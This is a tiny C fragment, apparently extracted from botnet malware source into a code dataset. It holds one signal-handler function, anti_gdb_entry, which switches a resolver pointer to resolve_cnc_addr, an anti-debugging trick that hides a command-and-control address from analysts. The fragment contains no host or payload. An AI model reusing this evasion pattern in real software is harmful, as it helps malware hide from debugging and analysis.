#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  resolve_cnc_addr ; 
 int /*<<< orphan*/  resolve_func ; 

__attribute__((used)) static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}